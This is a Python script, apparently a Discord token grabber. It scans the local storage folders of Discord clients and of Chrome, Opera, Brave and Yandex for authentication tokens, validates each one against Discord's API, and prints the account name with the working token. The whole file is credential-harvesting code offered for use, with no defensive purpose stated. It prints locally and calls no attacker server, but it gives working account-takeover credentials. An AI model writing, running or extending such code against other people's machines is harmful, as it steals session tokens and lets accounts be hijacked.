from glob import glob
import os,re,requests

#Clear console (not needed)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

def findToken(dbPattern):
    """
    Search for tokens
    Input: folder of .ldb
    Example: os.environ["APPDATA"] + "/discord/Local Storage/leveldb/*.ldb"
    Output: any working tokens found
    """
    tokenPatterns = (
        #All (current) types of Disord tokens
        re.compile(r"mfa\.(?:[A-Za-z0-9+_\-/]{20,})"),
        re.compile(r"(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})\.(?:[A-Za-z0-9+/]{4,})")
    )
    for dbPath in sorted(glob(dbPattern), reverse=True):
        with open(dbPath, "rb") as fp:
            for field in fp.read().split(b'"')[::-1]:
                try:
                    #Try to decode bytes
                    field = field.decode("ascii")
                except UnicodeDecodeError:
                    continue
                if any(pattern.match(field) for pattern in tokenPatterns):
                    #Check if the token works
                    req = requests.get("https://discord.com/api/users/@me", headers={'authorization': str(field)})
                    if requests.get("https://discord.com/api/users/@me", headers={'authorization': str(field)}).status_code == 200:
                        #Return working token
                        return field, req.json()
    #Return error of no tokens if none are found
    raise Exception("Couldn't find any Discord token.")

#List of places I know that have Tokens
cookieLoctions = {
    #Discord Clients
    "Discord": os.environ["APPDATA"] + "/discord",
    "Canary": os.environ["APPDATA"] + "/discordcanary",
    "Dev": os.environ["APPDATA"] + "/discorddevelopment",
    "LightCord": os.environ["APPDATA"] + "/Lightcord",
    
    #Browsers
    "Opera": os.environ["APPDATA"] + '/Opera Software/Opera Stable',
    "Opera GX": os.environ["APPDATA"] + '/Opera Software/Opera GX Stable',
    "Chrome": os.environ["LOCALAPPDATA"] + "/Google/Chrome/User Data/Default",
    "Brave": os.environ["LOCALAPPDATA"] + '/BraveSoftware/Brave-Browser/User Data/Default',
    "Yandex": os.environ["LOCALAPPDATA"] + '/Yandex/YandexBrowser/User Data/Default'
}

for platform, path in cookieLoctions.items():
    #Skip if the location doesnt exist
    if not os.path.exists(path):
        print(f'{platform}: Didn\'t exist')
        continue

    try:
        #Run token finder
        token, info = findToken(f'{path}/Local Storage/leveldb/*.ldb')

        #Get token info
        #info = requests.get("https://discord.com/api/users/@me", headers={'authorization': str(token)})
        #print out the info
        print(f'{platform} "{info["username"]}#{info["discriminator"]}": {token}')
    except:
        #Print that no WORKING tokens were found
        print(f'{platform}: Didn\'t exist or no token')
        pass
